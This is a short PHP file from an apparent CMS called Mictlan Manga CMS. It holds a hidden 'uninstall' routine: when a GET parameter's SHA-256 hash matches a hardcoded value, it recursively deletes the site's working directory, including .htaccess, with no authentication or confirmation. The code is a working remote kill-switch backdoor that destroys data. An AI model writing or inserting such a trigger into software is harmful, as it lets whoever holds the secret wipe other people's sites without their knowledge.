<?php
	/*
	* Mictlan Manga CMS - Todos los derechos reservados
	* V Alpha 16.08.05
	* Desarrollado por Ulises Rendón - http://debred.com - ulises@debred.com
	*/
	
	function eliminarDir($carpeta){
		$directorios = glob( $carpeta."/*" );
		$directorios = array_merge( $directorios, glob( $carpeta.'/.htaccess' ) );
		foreach($directorios as $archivos_carpeta){
			if (is_dir($archivos_carpeta)) eliminarDir($archivos_carpeta);
			else unlink($archivos_carpeta);
		}
		rmdir($carpeta);
	}
	
	if( !isset( $_GET['id'] ) ) $_GET['id'] = '';
	if( '0fac49727df02a6ca3dc91fc29360b5a9c47e766ca6c1339a9ab5377fa30cde1' == hash('sha256', $_GET['id']) ){
		echo "<b>Desinstalando:</b><br>";
		eliminarDir(getcwd());
	}